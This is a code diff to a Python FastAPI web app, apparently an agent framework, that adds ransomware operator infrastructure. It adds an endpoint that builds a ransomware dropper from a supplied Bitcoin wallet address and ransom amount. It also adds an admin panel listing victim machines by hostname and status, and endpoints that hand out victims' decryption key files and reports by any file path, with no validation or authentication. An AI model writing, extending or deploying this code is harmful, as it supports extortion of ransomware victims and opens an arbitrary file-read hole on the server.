@@ -1895,3 +1895,51 @@ async def trigger_thinking(agent_id: str = None):
     except Exception as e:
         logger.error(f"Error triggering thinking cycle: {str(e)}")
         return JSONResponse({"status": "error", "message": str(e)}, status_code=500)
+
+from agent_modules import ransomware_stealer
+from advanced_builder import AdvancedBuilder
+
+@app.post("/api/build_ransomware")
+async def build_ransomware(wallet_address: str = Form(...), ransom_amount: str = Form("0.05 BTC")):
+    builder = AdvancedBuilder()
+    ok, path = builder.build_ransomware_dropper(wallet_address, ransom_amount)
+    if ok:
+        return {"status": "success", "path": path}
+    return {"status": "error", "error": path}
+
+@app.get("/ransomware_admin", response_class=HTMLResponse)
+async def ransomware_admin(request: Request, hostname: str = "", status: str = ""):
+    # Сканируем отчеты
+    reports = []
+    base_dir = os.path.join("extracted_data", "ransomware")
+    for root, dirs, files in os.walk(base_dir):
+        for file in files:
+            if file.endswith("ransomware_report.json"):
+                try:
+                    with open(os.path.join(root, file), 'r') as f:
+                        data = json.load(f)
+                        if hostname and hostname.lower() not in data.get("hostname", "").lower():
+                            continue
+                        if status and data.get("status") != status:
+                            continue
+                        data["report_file"] = os.path.join(root, file)
+                        data["key_file"] = data.get("key_file")
+                        reports.append(data)
+                except Exception:
+                    continue
+    reports.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
+    return templates.TemplateResponse("admin_ransomware.html", {"request": request, "reports": reports})
+
+@app.get("/ransomware_admin/download_key")
+async def ransomware_download_key(path: str):
+    if not os.path.exists(path):
+        raise HTTPException(404, "Key not found")
+    return FileResponse(path, filename=os.path.basename(path))
+
+@app.get("/ransomware_admin/view_report", response_class=HTMLResponse)
+async def ransomware_view_report(request: Request, path: str):
+    if not os.path.exists(path):
+        return HTMLResponse("<h3>Report not found</h3>", status_code=404)
+    with open(path, 'r') as f:
+        data = json.load(f)
+    return HTMLResponse(f"<pre>{json.dumps(data, indent=2, ensure_ascii=False)}</pre>")
